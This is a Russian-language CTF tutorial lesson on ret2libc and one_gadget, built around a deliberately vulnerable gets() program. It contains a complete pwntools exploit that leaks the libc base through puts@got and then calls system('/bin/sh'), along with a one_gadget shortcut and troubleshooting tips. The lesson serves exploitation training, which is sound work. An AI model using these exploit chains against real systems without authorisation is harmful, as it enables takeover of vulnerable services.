---
id: pwn-ret2libc
title: "ret2libc и one_gadget"
category: pwn
parent: pwn-got-plt
difficulty: hard
order: 1
tags: [ret2libc, libc, leak, one_gadget, system]
prerequisites: [pwn-got-plt, pwn-rop]
useful_for:
  - "CTF Pwn категория"
  - "Обход ASLR"
  - "Vulnerability research"
estimated_minutes: 60
summary: "Строим полноценный эксплойт: утекаем libc, вычисляем базу и вызываем system('/bin/sh') или one_gadget — обход ASLR через ret2libc."
---

## Вопрос, с которого всё начинается

В бинаре есть переполнение, но нет функции `win`, которая открывает shell. Зато точно есть libc — а в libc есть `system`. Проблема одна: **ASLR** грузит libc по случайному адресу при каждом запуске. Ты не знаешь, куда прыгать.

Но у тебя есть утечка из прошлого урока. Сегодня мы соберём полноценный эксплойт: сначала узнаем адрес libc, потом вызовем `system("/bin/sh")`. Это **ret2libc** — самый частый приём в pwn.

## Наш пример: тот же chall

```c
#include <stdio.h>
int main(void) {
    char buf[64];
    puts("Input:");
    gets(buf);
    return 0;
}
```

```bash
$ gcc -fno-stack-protector -no-pie -o chall chall.c
$ checksec --file=./chall
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX включён — shellcode на стеке не запустить. `win` нет. Non-PIE — значит адреса бинаря фиксированы. Единственный путь — ret2libc.

## Шаг 1. Смещение до адреса возврата

Сначала найдём, через сколько байт мы дотягиваемся до сохранённого `rip`. Используем паттерн:

```bash
$ python3 -c "from pwn import *; print(cyclic(200).decode())" > /tmp/pat
$ gdb -q ./chall -ex 'run < /tmp/pat' -ex 'info registers rip'
RIP = 0x6161616c
$ python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
72
```

Смещение `72` = буфер 64 + сохранённый `rbp` 8. Никогда не угадывай его «на глаз» — `cyclic_find` обязателен.

## Шаг 2. Первый раунд: утечка libc

Из урока про GOT мы знаем: `puts(puts@got)` печатает реальный адрес `puts` в libc. Соберём цепочку и **вернёмся в `main`**, чтобы получить второй ввод:

```python
from pwn import *
context.binary = elf = ELF('./chall')
libc = ELF('./libc.so.6', checksec=False)

p = process('./chall')
rop = ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']])   # puts(puts@got)
rop.call(elf.symbols['main'])                  # вернуться в main
p.sendlineafter(b'Input:\n', flat({72: rop.chain()}))

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc base = {hex(libc.address)}')
```

```text
[+] libc base = 0x7ffff7dc0000
```

`rop.call(plt, [got])` собирает цепочку из `pop rdi; ret`, адреса `puts@plt` и адреса возврата `main`. `ljust(8, b'\x00')` дополняет утечку: `puts` печатает только до первого нулевого байта.

Ключевой момент: **база libc = утёкший адрес − оффсет `puts`**. Оффсет фиксирован для данной libc, поэтому одно вычитание даёт нам всю библиотеку.

## Шаг 3. Второй раунд: system("/bin/sh")

Теперь, когда `libc.address` установлен, pwntools сам считает абсолютные адреса. Собираем вторую цепочку:

```python
rop2 = ROP(libc)
rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
p.sendlineafter(b'Input:\n', flat({72: rop2.chain()}))
p.interactive()
```

```text
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

`ROP(libc)` использует уже заданный `libc.address` как базу. Строку `/bin/sh` ищем прямо в libc через `libc.search`. Порядок обязателен: **сначала утечка, потом `system`** — без базы мы не знаем адрес `system`.

## Шаг 4. Если `pop rdi` нет: one_gadget

Иногда в бинаре нет `pop rdi; ret`, или места под длинную цепочку мало. Тогда используют **one_gadget** — волшебный адрес внутри libc, при переходе на который сразу вызывается `execve("/bin/sh")`:

```bash
$ one_gadget ./libc.so.6
0xe3afe execve("/bin/sh", r15, r12)
constraints: [r15] == NULL || r15 == NULL || r12 == NULL
```

```python
one = libc.address + 0xe3afe
payload = flat({72: p64(one)})
```

У one_gadget есть **constraints** — условия на регистры (обычно они должны быть нулевыми). Если условия не выполнены, процесс упадёт. Поэтому one_gadget удобен, но требует проверки.

## Разбор утечки через GOT и повторный вызов main

Первый этап ret2libc стоит разобрать по шагам ещё раз, потому что именно здесь чаще всего ломается эксплойт. Переполнение возвращает управление на `puts@plt` с аргументом `puts@got` (через `pop rdi; ret`), а затем — в `main`, чтобы получить второй раунд. `puts` печатает 8 байт адреса из GOT; мы читаем их через `u64(p.recvline().strip().ljust(8, b'\x00'))`, вычисляем базу и строим второй payload. Важно: при возврате в `main` стек должен быть корректным, а выравнивание — учтено. Если `main` не подходит (например, меняет состояние), вернись в начало уязвимой функции. Для 32-битных бинарей аргументы передаются на стеке — цепочка проще, `pop rdi` не нужен.

## Шаг 5. Стабилизация

Если shell не поднимается — проверь по порядку:

- **Выравнивание стека.** Добавь лишний `ret`-гаджет перед `system`: многие SSE-инструкции в libc (`movaps`) требуют, чтобы `rsp` был выровнен по 16. Это классическая причина краха «почти рабочего» эксплойта.
- **Парсинг утечки.** Первая строка вывода может содержать мусор — используй `recvuntil`.
- **Версия libc.** Оффсет `puts` из другой версии даст мусорную базу. Сверяй младшие 12 бит.
- **Отладка.** `gdb.attach(p, 'b system\nc')` — посмотри, доходит ли управление до `system`.

## Шаг 6. Когда классический ret2libc не работает

- **Нет `pop rdi`** → ret2csu (`pwn-ret2csu`) или `pop rdi` из libc.
- **Нет строки `/bin/sh`** → запиши её в `.bss` через `read`, затем `system(bss)`.
- **Статическая линковка (нет libc)** → ret2syscall: `rax=59`, `rdi=/bin/sh`, `syscall` (`pwn-static-no-libc`).
- **seccomp запрещает execve** → только ORW: `open("flag")`, `read`, `write` (`pwn-seccomp-srop`).
- **Canary** → сначала утечь и восстановить canary (`pwn-canary-bypass`).
- **PIE** → нужна утечка базы бинаря (`pwn-pie-bypass`).

## Справочник: офсеты и гаджеты

Типичные шаги при работе с libc в pwntools:

```python
from pwn import *
libc = ELF('./libc.so.6')
print(hex(libc.symbols['system']))          # оффсет system
print(hex(libc.symbols['puts']))            # оффсет puts (для leak)
print(hex(next(libc.search(b'/bin/sh'))))   # оффсет строки
print(ROP(libc).find_gadget(['pop rdi','ret']))  # гаджет pop rdi; ret
```

| Что | Как получить |
|---|---|
| `libc_base` | `leak_puts - libc.symbols['puts']` |
| `system` | `libc_base + libc.symbols['system']` |
| `/bin/sh` | `libc_base + next(libc.search(b'/bin/sh'))` |
| `pop rdi; ret` | `libc_base + ROP(libc).find_gadget(['pop rdi','ret']).address` |
| one_gadget | `libc_base + <offset из one_gadget>` |

## Определение версии libc

Если libc не дана, её находят по утечке через `libc-database`:

```bash
$ ./find puts 6f0
```

Младшие 12 бит адреса символа не зависят от ASLR — их достаточно для поиска. Для надёжности используй утечку двух-трёх символов (`puts`, `read`, `system`): комбинация уникальна. Подробнее — в `pwn-libc-database`.

## На что смотреть дальше

- **Утечка должна быть из libc** — адреса начинаются с `0x7f`. Если нет, ты утёк что-то другое.
- **`libc.symbols` до установки `libc.address` возвращают оффсеты**, а не адреса. Не забудь задать базу.
- **Второй round-trip обязателен** — после утечки нужен возврат в `main` для вызова `system`.
- **Выравнивание** — самая частая причина «непонятного» краха.
- **Canary и PIE** обходятся до ret2libc, а не в его процессе.

## Что мы теперь знаем

- ret2libc обходит ASLR в два шага: утечка базы, затем `system`.
- База libc = утёкший адрес функции − её оффсет.
- `ROP(libc)` после установки `libc.address` считает абсолютные адреса.
- one_gadget даёт shell одним прыжком, но с условиями на регистры.
- Выравнивание стека (`ret` перед `system`) — частая причина краха.

## Квиз

Проверь себя.

```quiz
- question: "Зачем в ret2libc нужна утечка libc?"
  options:
    - "Адрес system рандомизирован ASLR — нужна база libc"
    - "Чтобы отключить NX"
    - "Чтобы снять canary"
    - "Чтобы расширить tcache"
  answer: 0
  explanation: "ASLR рандомизирует базу libc; утечка даёт реальные адреса."
- question: "Что утекают в первом round-trip?"
  options:
    - "GOT-запись уже вызванной функции (например, puts@got)"
    - "Canary"
    - "Стек"
    - "heap base"
  answer: 0
  explanation: "puts@got содержит реальный адрес puts, по нему вычисляют базу libc."
- question: "Что делает ROP(libc) после установки libc.address?"
  options:
    - "Вычисляет абсолютные адреса гаджетов и символов libc"
    - "Собирает бинарь"
    - "Отключает ASLR"
    - "Сканирует порты"
  answer: 0
  explanation: "ROP(libc) использует libc.address как базу для адресов."
- question: "Что такое one_gadget?"
  options:
    - "Адрес в libc, вызывающий execve('/bin/sh') при выполнении условий"
    - "Первый гаджет ROP"
    - "Одноразовый токен"
    - "Флаг сборки"
  answer: 0
  explanation: "one_gadget упрощает получение shell, если соблюдены constraints."
- question: "Почему нужен второй round-trip?"
  options:
    - "Сначала утекаем libc, затем возвращаемся в main для вызова system"
    - "Чтобы включить ASLR"
    - "Чтобы снять canary"
    - "Чтобы расширить tcache"
  answer: 0
  explanation: "После утечки возврат в main позволяет отправить второй payload с system."
```

## Куда дальше

В `pwn-fini-init-array` мы разберём, что делать, когда GOT защищён Full RELRO и перезаписать его нельзя — тогда целью становятся массивы `.fini_array`/`.init_array`. А пока главное: **ret2libc = утечка базы libc + `system("/bin/sh")`; два раунда, и ASLR больше не помеха.**

## Где пригодится

- **CTF:** Pwn — базовый приём любой задачи с NX.
- **Bug bounty:** эксплуатация нативных сервисов.
- **Пентест:** разработка эксплойтов.
- **Работа:** exploit development.
